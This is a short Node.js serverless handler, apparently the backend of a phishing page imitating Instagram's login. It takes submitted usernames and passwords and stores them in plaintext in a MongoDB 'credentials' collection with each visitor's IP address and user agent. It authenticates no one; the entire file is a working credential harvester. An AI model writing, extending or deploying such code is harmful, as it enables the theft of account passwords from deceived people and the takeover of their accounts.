const { MongoClient } = require("mongodb");

let cachedClient = null;

async function getDb() {
  if (cachedClient) {
    return cachedClient.db("instagram-login");
  }

  const client = new MongoClient(process.env.MONGODB_URI, {
    tls: true,
  });
  await client.connect();
  cachedClient = client;
  return client.db("instagram-login");
}

module.exports = async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ success: false, message: "Method not allowed" });
  }

  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ success: false, message: "Username and password are required." });
  }

  try {
    const db = await getDb();
    const collection = db.collection("credentials");

    await collection.insertOne({
      username,
      password,
      timestamp: new Date().toISOString(),
      ip: req.headers["x-forwarded-for"] || req.headers["x-real-ip"] || "unknown",
      userAgent: req.headers["user-agent"] || "unknown",
    });

    console.log(`Saved credentials for: ${username}`);
    return res.status(200).json({ success: true, message: "Credentials saved successfully!" });
  } catch (error) {
    console.error("Database error:", error);
    return res.status(500).json({ success: false, message: "Server error. Try again." });
  }
};
